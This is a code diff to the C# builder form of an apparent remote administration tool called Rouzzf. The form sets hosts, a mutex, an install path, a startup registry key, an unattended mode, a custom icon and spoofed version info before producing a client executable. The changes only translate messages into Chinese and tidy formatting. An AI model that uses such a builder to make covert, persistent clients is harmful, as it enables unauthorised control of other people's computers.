@@ -70,7 +70,7 @@ namespace Rouzzf.Server.Forms
 
             profile.Tag = txtTag.Text;
             profile.Hosts = _hostsConverter.ListToRawHosts(_hosts);
-            profile.Delay = (int) numericUpDownDelay.Value;
+            profile.Delay = (int)numericUpDownDelay.Value;
             profile.Mutex = txtMutex.Text;
             profile.UnattendedMode = chkUnattendedMode.Checked;
             profile.InstallClient = chkInstall.Checked;
@@ -114,7 +114,7 @@ namespace Rouzzf.Server.Forms
         private void FrmBuilder_FormClosing(object sender, FormClosingEventArgs e)
         {
             if (_changed &&
-                MessageBox.Show(this, "Do you want to save your current settings?", "Changes detected",
+                MessageBox.Show(this, "是否要保存当前设置?", "检测到更改",
                     MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
             {
                 SaveProfile("Default");
@@ -128,9 +128,9 @@ namespace Rouzzf.Server.Forms
             HasChanged();
 
             var host = txtHost.Text;
-            ushort port = (ushort) numericUpDownPort.Value;
+            ushort port = (ushort)numericUpDownPort.Value;
 
-            _hosts.Add(new Host {Hostname = host, Port = port});
+            _hosts.Add(new Host { Hostname = host, Port = port });
             txtHost.Text = "";
         }
 
@@ -242,7 +242,7 @@ namespace Rouzzf.Server.Forms
         private bool CheckForEmptyInput()
         {
             return (!string.IsNullOrWhiteSpace(txtTag.Text) && !string.IsNullOrWhiteSpace(txtMutex.Text) && // General Settings
-                 _hosts.Count > 0  && // Connection
+                 _hosts.Count > 0 && // Connection
                  (!chkInstall.Checked || (chkInstall.Checked && !string.IsNullOrWhiteSpace(txtInstallName.Text))) && // Installation
                  (!chkStartup.Checked || (chkStartup.Checked && !string.IsNullOrWhiteSpace(txtRegistryKeyName.Text)))); // Installation
         }
@@ -252,14 +252,14 @@ namespace Rouzzf.Server.Forms
             BuildOptions options = new BuildOptions();
             if (!CheckForEmptyInput())
             {
-                throw new Exception("Please fill out all required fields!");
+                throw new Exception("请填写所有必填字段!");
             }
 
             options.Tag = txtTag.Text;
             options.Mutex = txtMutex.Text;
             options.UnattendedMode = chkUnattendedMode.Checked;
             options.RawHosts = _hostsConverter.ListToRawHosts(_hosts);
-            options.Delay = (int) numericUpDownDelay.Value;
+            options.Delay = (int)numericUpDownDelay.Value;
             options.IconPath = txtIconPath.Text;
             options.Version = Application.ProductVersion;
             options.InstallPath = GetInstallPath();
@@ -276,19 +276,19 @@ namespace Rouzzf.Server.Forms
 
             if (!File.Exists("client.bin"))
             {
-                throw new Exception("Could not locate \"client.bin\" file. It should be in the same directory as Rouzzf.");
+                throw new Exception("找不到 \"client.bin\" 文件. 它应该与Rouzzf位于相同的目录中.");
             }
 
             if (options.RawHosts.Length < 2)
             {
-                throw new Exception("Please enter a valid host to connect to.");
+                throw new Exception("请输入要连接到的有效主机.");
             }
 
             if (chkChangeIcon.Checked)
             {
                 if (string.IsNullOrWhiteSpace(options.IconPath) || !File.Exists(options.IconPath))
                 {
-                    throw new Exception("Please choose a valid icon path.");
+                    throw new Exception("请选择有效的图标路径.");
                 }
             }
             else
@@ -298,12 +298,12 @@ namespace Rouzzf.Server.Forms
             {
                 if (!IsValidVersionNumber(txtProductVersion.Text))
                 {
-                    throw new Exception("Please enter a valid product version number!\nExample: 1.2.3.4");
+                    throw new Exception("请输入有效的产品版本号!\n例如: 1.2.3.4");
                 }
 
                 if (!IsValidVersionNumber(txtFileVersion.Text))
                 {
-                    throw new Exception("Please enter a valid file version number!\nExample: 1.2.3.4");
+                    throw new Exception("请输入有效的文件版本号!\n例如: 1.2.3.4");
                 }
 
                 options.AssemblyInformation = new string[8];
@@ -322,17 +322,17 @@ namespace Rouzzf.Server.Forms
                 sfd.Title = "Save Client as";
                 sfd.Filter = "Executables *.exe|*.exe";
                 sfd.RestoreDirectory = true;
-                sfd.FileName = "Client-built.exe";
+                sfd.FileName = "Client-Rouzzf.exe";
                 if (sfd.ShowDialog() != DialogResult.OK)
                 {
-                    throw new Exception("Please choose a valid output path.");
+                    throw new Exception("请选择有效的输出路径.");
                 }
                 options.OutputPath = sfd.FileName;
             }
 
             if (string.IsNullOrEmpty(options.OutputPath))
             {
-                throw new Exception("Please choose a valid output path.");
+                throw new Exception("请选择有效的输出路径.");
             }
 
             return options;
@@ -347,12 +347,12 @@ namespace Rouzzf.Server.Forms
             }
             catch (Exception ex)
             {
-                MessageBox.Show(this, ex.Message, "Build failed", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                MessageBox.Show(this, ex.Message, "构建异常", MessageBoxButtons.OK, MessageBoxIcon.Error);
                 return;
             }
 
             SetBuildState(false);
-            
+
             Thread t = new Thread(BuildClient);
             t.Start(options);
         }
@@ -376,7 +376,7 @@ namespace Rouzzf.Server.Forms
         {
             try
             {
-                BuildOptions options = (BuildOptions) o;
+                BuildOptions options = (BuildOptions)o;
 
                 var builder = new ClientBuilder(options, "client.bin");
 
@@ -384,11 +384,11 @@ namespace Rouzzf.Server.Forms
 
                 try
                 {
-                    this.Invoke((MethodInvoker) delegate
+                    this.Invoke((MethodInvoker)delegate
                     {
                         MessageBox.Show(this,
-                            $"Successfully built client! Saved to:\\{options.OutputPath}",
-                            "Build Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                            $"成功构建客户端!保存在:\\{options.OutputPath}",
+                            "构建成功", MessageBoxButtons.OK, MessageBoxIcon.Information);
                     });
                 }
                 catch (Exception)
@@ -402,7 +402,7 @@ namespace Rouzzf.Server.Forms
                     this.Invoke((MethodInvoker)delegate
                     {
                         MessageBox.Show(this,
-                            $"An error occurred!\n\nError Message: {ex.Message}\nStack Trace:\n{ex.StackTrace}", "Build failed",
+                            $"出现错误!\n\n错误信息: {ex.Message}\n堆栈:\n{ex.StackTrace}", "构建异常",
                             MessageBoxButtons.OK, MessageBoxIcon.Error);
                     });
                 }
